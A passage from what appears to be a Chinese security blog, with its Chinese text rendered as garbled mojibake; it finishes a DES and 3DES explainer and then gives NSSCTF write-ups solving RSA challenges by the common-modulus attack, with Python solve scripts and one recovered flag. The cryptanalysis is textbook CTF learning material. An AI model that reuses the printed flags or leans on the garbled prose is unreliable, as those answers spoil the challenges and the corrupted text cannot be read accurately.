<p>1.å°†32ä½ Rç»„è¿›è¡Œæ‹“å±•ç½®æ¢ï¼Œç”Ÿæˆ48ä½æ•°æ®;</p>
<p>2.å°†ç½®æ¢ç”Ÿæˆçš„48ä½æ•°æ®ä¸48ä½çš„å­å¯†é’¥è¿›è¡Œå¼‚æˆ–ï¼Œå¾—åˆ°48ä½è¿ç®—ç»“æœ;</p>
<p>3.å°†48ä½è¿ç®—ç»“æœåˆ†æˆ8ç»„ï¼Œæ¯ç»„6ä½ï¼Œè¿›è¡Œsç›’ç½®æ¢å¾—åˆ°4ä½çš„æ•°æ®;</p>
<p>4.å°†8ä¸ª4bitçš„æ•°æ®åˆå¹¶å¾—åˆ°32ä½æ•°æ®;</p>
<p>5.å°†32ä½æ•°æ®è¿›è¡ŒPç½®æ¢ æœ€ç»ˆå¾—åˆ°32ä½å¤„ç†ç»“æœã€‚</p>
<h4 id="æ‹“å±•ç½®æ¢"><a href="#æ‹“å±•ç½®æ¢" class="headerlink" title="æ‹“å±•ç½®æ¢"></a>æ‹“å±•ç½®æ¢</h4><p>é€šè¿‡æ‹“å±•ç½®æ¢ï¼Œå°†è¾“å…¥æ•°æ®é•¿åº¦ä»32ä½ã€4x8ã€‘å˜ä¸º48ä½ã€6x8ã€‘ï¼Œåœ¨ä¸¤è¾¹åˆ†åˆ«åŠ ä¸€åˆ—æ‹“å±•çš„é‡å¤æ•°æ®ã€‚</p>
<p><img src="/posts/64eed679/5.png"></p>
<h4 id="Sç›’ç½®æ¢"><a href="#Sç›’ç½®æ¢" class="headerlink" title="Sç›’ç½®æ¢"></a>Sç›’ç½®æ¢</h4><p>åœ¨sç›’ç½®æ¢ä¹‹å‰éœ€è¦å°†å¼‚æˆ–è¿ç®—çš„ç»“æœè¿›è¡Œåˆ†ç»„ã€48ä½ã€‘ï¼Œä»å‰å¾€ååˆ†æˆ8ç»„ï¼Œæ¯ç»„6bitæ•°æ®ï¼Œæ¯ç»„å¯¹åº”ä¸€ä¸ªSç›’è¡¨ã€‚ã€s1~s8ç›’è¡¨å†…å®¹å¦‚ä¸‹ã€‘</p>
<p><img src="/posts/64eed679/6.png"></p>
<p><img src="/posts/64eed679/7.png"></p>
<p>éƒ½æ˜¯ç”± 4x16çŸ©é˜µæ„æˆï¼Œæ‰€ä»¥å¯ä»¥ä»¥4bitæ¥è¡¨ç¤ºã€‚</p>
<p>åœ¨æ‹“å±•ç½®æ¢åçš„æ•°ä¸­ï¼Œç¬¬ä¸€ä¸ªbitç§°ä¸ºMSBï¼Œæœ€åä¸€bitç§°ä¸ºä¸ºLSBï¼Œç¬¬ä¸€ä¸ªbitæƒé‡æœ€é«˜ï¼Œä¸­é—´4bitä¸ºåŸå§‹æ•°æ®ï¼Œæœ€åä¸€ä¸ªbitæƒé‡æœ€ä½ã€‚</p>
<p>MSBä½å’ŒLSBä½æ„æˆçš„äºŒè¿›åˆ¶è¡¨ç¤ºsç›’ä¸­è¡Œå·ï¼Œä¸­é—´åŸå§‹æ•°æ®çš„äºŒè¿›åˆ¶è¡¨ç¤ºåˆ—å·</p>
<p><img src="/posts/64eed679/8.png"></p>
<h4 id="Pç½®æ¢"><a href="#Pç½®æ¢" class="headerlink" title="Pç½®æ¢"></a>Pç½®æ¢</h4><p>Pç½®æ¢å’Œåˆå§‹ç½®æ¢å¤§ä¼¼ç›¸åŒ</p>
<p><img src="/posts/64eed679/9.png"></p>
<p>æœ€ç»ˆè¾“å‡º 32ä½æ•°æ®</p>
<h3 id="é€†åˆå§‹ç½®æ¢"><a href="#é€†åˆå§‹ç½®æ¢" class="headerlink" title="é€†åˆå§‹ç½®æ¢"></a>é€†åˆå§‹ç½®æ¢</h3><p>Få‡½æ•°è¾“å‡ºçš„32ä½æ•°æ® ä¸ L[i]ç»„æ•°æ®è¿›è¡ŒæŒ‰ä½å¼‚æˆ–è¿ç®—ï¼Œå¾—åˆ°32ä½è¿ç®—ç»“æœï¼Œæœ€åæŠŠç»“æœèµ‹å€¼ç»™R[i+1]ã€‚R[i]ç»„32ä½æ•°æ®ä¼šç›´æ¥èµ‹å€¼ç»™L[i+1]ã€ä¸åšä»»ä½•æ”¹å˜ã€‘</p>
<p>è¿™æ ·å°±å®Œæˆäº†ä¸€è½®DESç®—æ³•ã€‚ç»è¿‡16è½®å¤„ç†åå¾—åˆ°æœ€åä¸€ç»„æ•°æ®L[16]ã€R[16]ã€‚</p>
<p>R[i+1] = L[i] ^ F(R[i],K[i])</p>
<p>L[i+1] = R[i]</p>
<p>R[16]ä½œä¸ºå‰32ä½æ•°æ®ï¼ŒL[16]ä½œä¸ºå32ä½æ•°æ® åˆå¹¶å¾—åˆ°64ä½æ•°æ®ï¼Œç„¶åè¿›è¡Œé€†åˆå§‹å€¼ç½®å€¼å¤„ç†ã€å’Œåˆå§‹ç½®æ¢ç›¸ä¼¼ã€‘ æœ€ç»ˆå¾—åˆ°åŠ å¯†çš„å¯†æ–‡ã€‚</p>
<p><img src="/posts/64eed679/10.png"></p>
<h2 id="å¯†é’¥ç”Ÿæˆ"><a href="#å¯†é’¥ç”Ÿæˆ" class="headerlink" title="å¯†é’¥ç”Ÿæˆ"></a>å¯†é’¥ç”Ÿæˆ</h2><p>è¾“å…¥å¯†é’¥64ä½ã€å®é™…56ä½ï¼Œæ ¹æ®ç½®æ¢è¡¨å¾—åˆ°å¯†é’¥ 28ä½x2ã€‘</p>
<p><img src="/posts/64eed679/11.png"></p>
<h3 id="PC-1ç½®æ¢"><a href="#PC-1ç½®æ¢" class="headerlink" title="PC-1ç½®æ¢"></a>PC-1ç½®æ¢</h3><p><img src="/posts/64eed679/12.png"></p>
<p>PC-1ã€PERMUTED CHOICE 1 ã€‘ç½®æ¢è¡¨æ˜¯ä¸€ä¸ª 7x8çŸ©é˜µï¼Œ</p>
<p>å‰28ä½åˆ†ä¸ºä¸€ç»„è®°ä½œCç»„ï¼Œå28ä½ä¸ºå¦ä¸€ç»„è®°ä½œ Dç»„ã€‚</p>
<h3 id="å·¦ç§»å¤„ç†"><a href="#å·¦ç§»å¤„ç†" class="headerlink" title="å·¦ç§»å¤„ç†"></a>å·¦ç§»å¤„ç†</h3><p>å½“i=1,2,9,16è½®æ—¶ï¼ŒCã€Dä¸¤ç»„å‘å·¦ç§»ä¸€ä½ï¼Œå…¶ä»–è½®Cã€Dä¸¤ç»„å‘å·¦ç§»2ä½ã€‚</p>
<p><img src="/posts/64eed679/13.png"></p>
<h3 id="PC-2ç½®æ¢"><a href="#PC-2ç½®æ¢" class="headerlink" title="PC-2ç½®æ¢"></a>PC-2ç½®æ¢</h3><p>åœ¨è¿›è¡ŒPC-2ç½®æ¢å‰ï¼Œå°†å·¦ç§»åçš„C Dä¸¤ç»„æ•°æ®ã€28bitã€‘åˆå¹¶ï¼Œå½¢æˆ56bitçš„æ•°æ®å—ï¼ŒPC-2 ç½®æ¢è¡¨æ˜¯ä¸€ä¸ª 6x8çŸ©é˜µï¼Œç»è¿‡PC-2ç½®æ¢åä¼šå˜æˆä¸€ä¸ª48bitçš„å­å¯†é’¥ã€‚</p>
<p><img src="/posts/64eed679/14.png"></p>
<h1 id="3DES"><a href="#3DES" class="headerlink" title="3DES"></a>3DES</h1><p>å‚è€ƒ <a href="https://blog.csdn.net/qq_41137136/article/details/86416849">https://blog.csdn.net/qq_41137136/article/details/86416849</a></p>
<p>DESåŠ å¯†çš„ä¸€ç§æ¨¡å¼ï¼ŒåŸºäºDESçš„å¯¹ç§°åŠ å¯†ç®—æ³•ï¼Œä½¿ç”¨ä¸‰æ¡ä¸åŒçš„64ã€56ã€‘ä½å¯†é’¥å¯¹æ•°æ®è¿›è¡Œä¸‰æ¬¡åŠ å¯†ã€56x3=168ã€‘ã€‚</p>
<p>è®¾Ek()å’ŒDk()ä»£è¡¨DESç®—æ³•çš„åŠ å¯†å’Œè§£å¯†è¿‡ç¨‹ï¼ŒKä»£è¡¨DESç®—æ³•ä½¿ç”¨çš„<a href="https://so.csdn.net/so/search?q=%E5%AF%86%E9%92%A5&spm=1001.2101.3001.7020">å¯†é’¥</a>ï¼ŒPä»£è¡¨æ˜æ–‡ï¼ŒCä»£è¡¨å¯†è¡¨ï¼Œè¿™æ ·ï¼Œ</p>
<p>ã€€ã€€3DESåŠ å¯†è¿‡ç¨‹ä¸ºï¼šC=E(K1,D(K2,E(K1,P))ï¼Œ</p>
<p>ã€€ã€€3DESè§£å¯†è¿‡ç¨‹ä¸ºï¼šP=D(K1,E(K2,D(K1,C))</p>
<p>K1ã€K2ã€K3å†³å®šäº†ç®—æ³•çš„å®‰å…¨æ€§ï¼Œè‹¥ä¸‰ä¸ªå¯†é’¥äº’ä¸ç›¸åŒï¼Œæœ¬è´¨ä¸Šå°±ç›¸å½“äºç”¨ä¸€ä¸ªé•¿ä¸º168ä½çš„å¯†é’¥è¿›è¡ŒåŠ å¯†ã€‚å¤šå¹´æ¥ï¼Œå®ƒåœ¨å¯¹ä»˜å¼ºåŠ›æ”»å‡»æ—¶æ˜¯æ¯”è¾ƒå®‰å…¨çš„ã€‚è‹¥æ•°æ®å¯¹å®‰å…¨æ€§è¦æ±‚ä¸é‚£ä¹ˆé«˜ï¼ŒK1å¯ä»¥ç­‰äºK3ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå¯†é’¥çš„æœ‰æ•ˆé•¿åº¦ä¸º112ä½ã€‚</p>
<p><img src="/posts/64eed679/15.png"></p>
<p><img src="/posts/64eed679/16.png"></p>
<p>å¦‚æœä¸‰ä¸ªå¯†é’¥éƒ½ç›¸åŒï¼Œåˆ™3DESç­‰ä»·äºDES;</p>
<p>å¦‚æœæœ‰ä¸¤ä¸ªä¸åŒçš„å¯†é’¥ï¼Œåˆ™è¿™ç§3DESç§°ä¸ºDES-EDE2;</p>
<p>å¦‚æœæœ‰ä¸‰ä¸ªä¸åŒçš„å¯†é’¥ï¼Œåˆ™è¿™ç§3DESç§°ä¸ºDES-EDE3.ã€EDEè¡¨ç¤ºåŠ å¯†-è§£å¯†-åŠ å¯†çš„è¿‡ç¨‹ã€‘</p>
<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://bbs.kanxue.com/thread-269299.htm">https://bbs.kanxue.com/thread-269299.htm</a></p>
<p><a href="https://bbs.kanxue.com/thread-253558.htm">https://bbs.kanxue.com/thread-253558.htm</a></p>
<p><a href="https://www.xuenixiang.com/thread-2477-1-1.html">https://www.xuenixiang.com/thread-2477-1-1.html</a></p>
]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>Crypto</tag>
      </tags>
  </entry>
  <entry>
    <title>NSSCTF Crypto 01</title>
    <url>/posts/bb5a57d9/</url>
    <content><![CDATA[<p>è®°å½•ä¸‹è¿‘æœŸåœ¨NSSCTF Cryptoçš„åˆ·é¢˜è®°å½•  â€¦. å¯†ç å­¦æ–°æ‰‹èœé¸¡ç®€å•è®°å½•ã€‚æ•°å­¦åŸºç¡€ä¸æ˜¯å¾ˆå¥½ è¿˜åœ¨æ…¢æ…¢è¡¥â€¦â€¦</p>
<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto1-å…±æ¨¡æ”»å‡»"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto1-å…±æ¨¡æ”»å‡»" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto1 å…±æ¨¡æ”»å‡»"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto1 å…±æ¨¡æ”»å‡»</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;****************************&#x27;</span></span><br><span class="line">flag = &#123;<span class="string">&quot;asfajgfbiagbwe&quot;</span>&#125;</span><br><span class="line">p = getPrime(<span class="number">2048</span>)</span><br><span class="line">q = getPrime(<span class="number">2048</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">e1e2 = <span class="number">3087</span></span><br><span class="line">n = p*q</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 463634070971821449698012827631572665302589213868521491855038966879005784397309389922926838028598122795187584361359142761652619958273094398420314927073008031088375892957173280915904309949716842152249806486027920136603248454946737961650252641668562626310035983343018705370077783879047584582817271215517599531278507300104564011142229942160380563527291388260832749808727470291331902902518196932928128107067117198707209620169906575791373793854773799564060536121390593687449884988936522369331738199522700261116496965863870682295858957952661531894477603953742494526632841396338388879198270913523572980574440793543571757278020533565628285714358815083303489096524318164071888139412436112963845619981511061231001617406815056986634680975142352197476024575809514978857034477688443230263761729039797859697947454810551009108031457294164840611157524719173343259485881089252938664456637673337362424443150013961181619441267926981848009107466576314685961478748352388452114042115892243272514245081604607798243817586737546663059737344687130881861357423084448027959893402445303299089606081931041217035955143939567456782107203447898345284731038150377722447329202078375870541529539840051415759436083384408203659613313535094343772238691393447475364806171594</span></span><br><span class="line"><span class="comment">#flag2= 130959534275704453216282334815034647265875632781798750901627773826812657339274362406246297925411291822193191483409847323315110393729020700526946712786793380991675008128561863631081095222226285788412970362518398757423705216112313533155390315204875516645459370629706277876211656753247984282379731850770447978537855070379324935282789327428625259945250066774049650951465043700088958965762054418615838049340724639373351248933494355591934236360506778496741051064156771092798005112534162050165095430065000827916096893408569751085550379620558282942254606978819033885539221416335848319082054806148859427713144286777516251724474319613960327799643723278205969253636514684757409059003348229151341200451785288395596484563480261212963114071064979559812327582474674812225260616757099890896900340007990585501470484762752362734968297532533654846190900571017635959385883945858334995884341767905619567505341752047589731815868489295690574109758825021386698440670611361127170896689015108432408490763723594673299472336065575301681055583084547847733168801030191262122130369687497236959760366874106043801542493392227424890925595734150487586757484304609945827925762382889592743709682485229267604771944535469557860120878491329984792448597107256325783346904408</span></span><br><span class="line"><span class="comment">#n= 609305637099654478882754880905638123124918364116173050874864700996165096776233155524277418132679727857702738043786588380577485490575591029930152718828075976000078971987922107645530323356525126496562423491563365836491753476840795804040219013880969539154444387313029522565456897962200817021423704204077133003361140660038327458057898764857872645377236870759691588009666047187685654297678987435769051762120388537868493789773766688347724903911796741124237476823452505450704989455260077833828660552130714794889208291939055406292476845194489525212129635173284301782141617878483740788532998492403101324795726865866661786740345862631916793208037250277376942046905892342213663197755010315060990871143919384283302925469309777769989798197913048813940747488087191697903624669415774198027063997058701217124640082074789591591494106726857376728759663074734040755438623372683762856958888826373151815914621262862750497078245369680378038995425628467728412953392359090775734440671874387905724083226246587924716226512631671786591611586774947156657178654343092123117255372954798131265566301316033414311712092913492774989048057650627801991277862963173961355088082419091848569675686058581383542877982979697235829206442087786927939745804017455244315305118437</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>é¢˜ç›®åˆ†æï¼š</p>
<p>1.e1*e2=3087 å°è¯•åˆ†è§£e1 e2</p>
<p>2.flag1 flag2ã€c1 c2ã€‘ å…¬ç”¨åŒä¸€ä¸ªæ¨¡è¿›è¡ŒåŠ å¯†ã€å…±æ¨¡æ”»å‡»ã€‘</p>
<p>åˆ©ç”¨å‰æï¼š RSAåœ¨ç”Ÿæˆå¯†é’¥è¿‡ç¨‹ä¸­ä½¿ç”¨ç›¸åŒçš„æ¨¡æ•° n</p>
<p>å·²çŸ¥ n c1 c2 e1 e2 æ±‚m ã€åœ¨ä¸çŸ¥d1 d2æƒ…å†µä¸‹å¾—åˆ°mã€‘</p>
<p><img src="/posts/bb5a57d9/1.png"></p>
<p>WP:</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"></span><br><span class="line"><span class="comment"># å·²çŸ¥c1 c2 n  åˆ†è§£e1e2å¾—åˆ°e1\e2  ä½¿ç”¨å…±æ¨¡æ”»å‡»</span></span><br><span class="line">c1= <span class="number">463634070971821449698012827631572665302589213868521491855038966879005784397309389922926838028598122795187584361359142761652619958273094398420314927073008031088375892957173280915904309949716842152249806486027920136603248454946737961650252641668562626310035983343018705370077783879047584582817271215517599531278507300104564011142229942160380563527291388260832749808727470291331902902518196932928128107067117198707209620169906575791373793854773799564060536121390593687449884988936522369331738199522700261116496965863870682295858957952661531894477603953742494526632841396338388879198270913523572980574440793543571757278020533565628285714358815083303489096524318164071888139412436112963845619981511061231001617406815056986634680975142352197476024575809514978857034477688443230263761729039797859697947454810551009108031457294164840611157524719173343259485881089252938664456637673337362424443150013961181619441267926981848009107466576314685961478748352388452114042115892243272514245081604607798243817586737546663059737344687130881861357423084448027959893402445303299089606081931041217035955143939567456782107203447898345284731038150377722447329202078375870541529539840051415759436083384408203659613313535094343772238691393447475364806171594</span></span><br><span class="line">c2= <span class="number">130959534275704453216282334815034647265875632781798750901627773826812657339274362406246297925411291822193191483409847323315110393729020700526946712786793380991675008128561863631081095222226285788412970362518398757423705216112313533155390315204875516645459370629706277876211656753247984282379731850770447978537855070379324935282789327428625259945250066774049650951465043700088958965762054418615838049340724639373351248933494355591934236360506778496741051064156771092798005112534162050165095430065000827916096893408569751085550379620558282942254606978819033885539221416335848319082054806148859427713144286777516251724474319613960327799643723278205969253636514684757409059003348229151341200451785288395596484563480261212963114071064979559812327582474674812225260616757099890896900340007990585501470484762752362734968297532533654846190900571017635959385883945858334995884341767905619567505341752047589731815868489295690574109758825021386698440670611361127170896689015108432408490763723594673299472336065575301681055583084547847733168801030191262122130369687497236959760366874106043801542493392227424890925595734150487586757484304609945827925762382889592743709682485229267604771944535469557860120878491329984792448597107256325783346904408</span></span><br><span class="line">n= <span class="number">609305637099654478882754880905638123124918364116173050874864700996165096776233155524277418132679727857702738043786588380577485490575591029930152718828075976000078971987922107645530323356525126496562423491563365836491753476840795804040219013880969539154444387313029522565456897962200817021423704204077133003361140660038327458057898764857872645377236870759691588009666047187685654297678987435769051762120388537868493789773766688347724903911796741124237476823452505450704989455260077833828660552130714794889208291939055406292476845194489525212129635173284301782141617878483740788532998492403101324795726865866661786740345862631916793208037250277376942046905892342213663197755010315060990871143919384283302925469309777769989798197913048813940747488087191697903624669415774198027063997058701217124640082074789591591494106726857376728759663074734040755438623372683762856958888826373151815914621262862750497078245369680378038995425628467728412953392359090775734440671874387905724083226246587924716226512631671786591611586774947156657178654343092123117255372954798131265566301316033414311712092913492774989048057650627801991277862963173961355088082419091848569675686058581383542877982979697235829206442087786927939745804017455244315305118437</span></span><br><span class="line">e1e2 = <span class="number">3087</span></span><br><span class="line"><span class="comment"># factordb å¯ä»¥å°†e1e2åˆ†è§£æˆ  3^2*7^3</span></span><br><span class="line"><span class="comment"># ç›¸æ¯”ä¸çˆ†ç ´ 2~3087 æ•ˆç‡ä¼šé«˜å¾ˆå¤š</span></span><br><span class="line">fac = [<span class="number">3</span>,<span class="number">7</span>,<span class="number">3</span>*<span class="number">3</span>,<span class="number">3</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">7</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">7</span>*<span class="number">7</span>*<span class="number">7</span>,<span class="number">7</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">3</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">3</span>*<span class="number">7</span>*<span class="number">7</span>,<span class="number">3</span>*<span class="number">3</span>*<span class="number">7</span>*<span class="number">7</span>*<span class="number">7</span>]</span><br><span class="line"><span class="comment"># print(len(fac))</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> e1 <span class="keyword">in</span> fac:</span><br><span class="line">    <span class="keyword">if</span> e1e2 % e1 == <span class="number">0</span>:</span><br><span class="line">        e2 = e1e2 // e1</span><br><span class="line">        <span class="comment"># æ¬§å‡ é‡Œå¾—æ‹“å±•  e1*s1+e2*s2=1</span></span><br><span class="line">        s0,s1,s2 = gmpy2.gcdext(e1,e2)</span><br><span class="line">        <span class="comment"># print(s0,s1,s2)</span></span><br><span class="line">        <span class="comment"># # å…±æ¨¡æ”»å‡»</span></span><br><span class="line">        m_s0 = <span class="built_in">pow</span>(c1, s1, n) * <span class="built_in">pow</span>(c2, s2, n) % n</span><br><span class="line">        m = long_to_bytes(gmpy2.iroot(m_s0,s0)[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;NSSCTF&#123;d64dba66-b608-4255-b888-0b0f25c2f90e&#125;&#x27;</span></span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto2-å…±æ¨¡æ”»å‡»"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto2-å…±æ¨¡æ”»å‡»" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto2 å…±æ¨¡æ”»å‡»"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto2 å…±æ¨¡æ”»å‡»</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;***************&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">e1 = getPrime(<span class="number">32</span>)</span><br><span class="line">e2 = getPrime(<span class="number">32</span>)</span><br><span class="line"><span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,e1,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,e2,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e1= &#x27;</span> +<span class="built_in">str</span>(e1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;e2= &#x27;</span>+<span class="built_in">str</span>(e2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line"><span class="comment">#flag2= 86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line"><span class="comment">#e1= 3247473589</span></span><br><span class="line"><span class="comment">#e2= 3698409173</span></span><br><span class="line"><span class="comment">#n= 103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>WPï¼š</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rsa_gong_N_def</span>(<span class="params">e1,e2,c1,c2,n</span>): <span class="comment">#å…±æ¨¡æ”»å‡»å‡½æ•°</span></span><br><span class="line">    e1, e2, c1, c2, n=<span class="built_in">int</span>(e1),<span class="built_in">int</span>(e2),<span class="built_in">int</span>(c1),<span class="built_in">int</span>(c2),<span class="built_in">int</span>(n)</span><br><span class="line">    s = gmpy2.gcdext(e1, e2)</span><br><span class="line">    s1 = s[<span class="number">1</span>]</span><br><span class="line">    s2 = s[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> s1 &lt; <span class="number">0</span>:</span><br><span class="line">        s1 = - s1</span><br><span class="line">        c1 = gmpy2.invert(c1, n)</span><br><span class="line">    <span class="keyword">elif</span> s2 &lt; <span class="number">0</span>:</span><br><span class="line">        s2 = - s2</span><br><span class="line">        c2 = gmpy2.invert(c2, n)</span><br><span class="line">    m = (<span class="built_in">pow</span>(c1,s1,n) * <span class="built_in">pow</span>(c2 ,s2 ,n)) % n</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(m)</span><br><span class="line"></span><br><span class="line">c1= <span class="number">100156221476910922393504870369139942732039899485715044553913743347065883159136513788649486841774544271396690778274591792200052614669235485675534653358596366535073802301361391007325520975043321423979924560272762579823233787671688669418622502663507796640233829689484044539829008058686075845762979657345727814280</span></span><br><span class="line">c2= <span class="number">86203582128388484129915298832227259690596162850520078142152482846864345432564143608324463705492416009896246993950991615005717737886323630334871790740288140033046061512799892371429864110237909925611745163785768204802056985016447086450491884472899152778839120484475953828199840871689380584162839244393022471075</span></span><br><span class="line">e1= <span class="number">3247473589</span></span><br><span class="line">e2= <span class="number">3698409173</span></span><br><span class="line">n= <span class="number">103606706829811720151309965777670519601112877713318435398103278099344725459597221064867089950867125892545997503531556048610968847926307322033117328614701432100084574953706259773711412853364463950703468142791390129671097834871371125741564434710151190962389213898270025272913761067078391308880995594218009110313</span></span><br><span class="line"></span><br><span class="line">m = rsa_gong_N_def(e1,e2,c1,c2,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<h2 id="SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto3"><a href="#SWPUCTF-2021-æ–°ç”Ÿèµ›-crypto3" class="headerlink" title="[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto3 [-]"></a>[SWPUCTF 2021 æ–°ç”Ÿèµ›]crypto3 [-]</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">flag  = <span class="string">&#x27;******************&#x27;</span></span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">m1 = bytes_to_long(<span class="built_in">bytes</span>(flag.encode()))</span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line"></span><br><span class="line">flag1 = <span class="built_in">pow</span>(m1,p,n)</span><br><span class="line">flag2 = <span class="built_in">pow</span>(m1,q,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag1= &#x27;</span>+<span class="built_in">str</span>(flag1))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag2= &#x27;</span>+<span class="built_in">str</span>(flag2))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n= &#x27;</span>+<span class="built_in">str</span>(n))</span><br><span class="line"></span><br><span class="line"><span class="comment">#flag1= 17893542812755845772427795161304049467610774531005620109503081344099161906017295486868699578946474114607624347167976713200068059018517606363517478396368430072890681401898145302336139240273132723451063402106360810413024642916851746118524166947301681245568333254648265529408446609050354235727237078987509705857</span></span><br><span class="line"><span class="comment">#flag2= 95580409405085606847879727622943874726633827220524165744517624606566789614499137069562997931972825651309707390763700301965277040876322904891716953565845966918293178547100704981251056401939781365264616997055296773593435626490578886752446381493929807909671245959154990639046333135728431707979143972145708806954</span></span><br><span class="line"><span class="comment">#n= 140457323583824160338989317689698102738341061967768153879646505422358544720607476140977064053629005764551339082120337223672330979298373653766782620973454095507484118565884885623328751648660379894592063436924903894986994746394508539721459355200184089470977772075720319482839923856979166319700474349042326898971</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å…±æ¨¡n  å·²çŸ¥c1 c2 ä½†æ˜¯e1 e2æœªçŸ¥</p>
